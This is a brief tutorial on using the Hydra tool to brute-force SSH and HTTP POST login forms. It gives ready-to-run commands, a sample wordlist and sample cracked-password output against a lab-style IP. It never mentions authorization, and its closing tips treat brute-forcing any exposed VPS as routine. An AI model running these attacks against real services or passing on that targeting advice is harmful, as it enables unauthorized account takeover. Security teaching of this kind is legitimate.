
# Hydra

Hydra is a powerful tool in the THC (The Hacker’s Choice) toolkit for brute-forcing login credentials. It can target a variety of services such as SSH, FTP, HTTP, and more. It's fast and flexible but noisy, so stealth is optional. This guide will focus on using Hydra for cracking SSH and HTTP POST web forms.

## General Syntax

The basic structure of a Hydra command is:

```
hydra [options] <target> <service>
```

- **Options**: Flags like `-l`, `-P`, `-t` to tweak how Hydra attacks.
- **Target**: The IP address or hostname of the target.
- **Service**: The protocol to attack (e.g., `ssh`, `http-post-form`).

---

## Scenario 1: Brute-Forcing SSH

**Purpose**: Crack SSH credentials to gain access to a server.

**Command**:
```
hydra -l <username> -P <full path to pass> <target_IP> -t 4 ssh
```

### Key Options Explained:

- **-l <username>**: Specify the username (e.g., `root`, `admin`, `user`).
- **-P <full path to pass>**: Provide the path to the password list (e.g., `/home/user/passwords.txt`).
- **<target_IP>**: The IP address of the target server (e.g., `10.10.10.10`).
- **-t 4**: Set the number of parallel tasks (threads) to 4 (for faster or slower attacks).
- **ssh**: Indicates the SSH service to target.

**Example**:
```
hydra -l root -P /home/user/passwords.txt 10.10.10.10 -t 4 ssh
```

### Output:
```
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4)
[DATA] attacking ssh://10.10.10.10:22/
[22][ssh] host: 10.10.10.10   login: root   password: toor
```

---

## Scenario 2: Brute-Forcing HTTP POST Web Forms

**Purpose**: Crack login credentials for web forms using HTTP POST requests.

**Command**:
```
hydra -l <username> -P <wordlist> <target_IP> http-post-form "<path>:<login_credentials>:<invalid_response>" -V
```

### Key Options Explained:

- **-l <username>**: Username for the form (e.g., `admin`).
- **-P <wordlist>**: Password list file (e.g., `/home/user/wordlist.txt`).
- **<target_IP>**: Target web server IP (e.g., `10.10.10.10`).
- **http-post-form**: Specifies a POST-based web form attack.
- **"<path>:<login_credentials>:<invalid_response>"**: Configures Hydra to hit the right endpoint and detect login failures.
- **-V**: Verbose mode to show all attempts.

**Example**:
```
hydra -l admin -P /home/user/wordlist.txt 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

### Sample Wordlist:
```
admin
123456
letmein
password123
```

### Output:
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 4 login tries (l:1/p:4)
[DATA] attacking http-post-form://10.10.10.10//
[ATTEMPT] target 10.10.10.10 - login "admin" - pass "letmein"
[80][http-post-form] host: 10.10.10.10   login: admin   password: letmein
```

---

## Extra Flags to Consider:

- **-L <userlist>**: Try multiple usernames (e.g., `admin`, `user`, `test`).
- **-f**: Stop on first success (useful for quicker results).
- **-s <port>**: Specify a custom port if the target is not on the default port.
- **-t <tasks>**: Adjust the number of threads for faster or slower attacks.
- **-V**: Verbose mode to show each attempt.

---

## Real-World Use:

1. **SSH**: If you find a weak VPS with SSH exposed, use a small wordlist and lower threads to avoid account lockouts.
2. **HTTP POST**: For web forms, inspect the request with tools like Burp Suite, identify the field names, and then use Hydra to crack the login.

---
